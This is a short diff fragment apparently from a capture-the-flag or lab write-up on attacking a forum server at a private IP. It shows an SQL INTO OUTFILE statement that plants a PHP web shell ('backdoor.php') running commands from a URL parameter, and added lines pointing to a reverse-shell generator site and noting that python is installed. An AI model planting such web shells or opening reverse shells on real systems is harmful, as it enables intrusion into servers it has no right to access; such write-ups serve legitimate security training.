@@ -105,3 +105,6 @@ SELECT "<? system($_GET['cmd']); ?>" into outfile "/var/www/forum/templates_c/ba
 
 Now if we use "https://192.168.1.96/forum/templates_c/backdoor.php?cmd=" we have a reverse shell!!
 
+for a better shell we can inject a real reverse shell like as suggested from https://www.revshells.com/
+we can see with 'ls /usr/bin' that python is installed, so with:
+
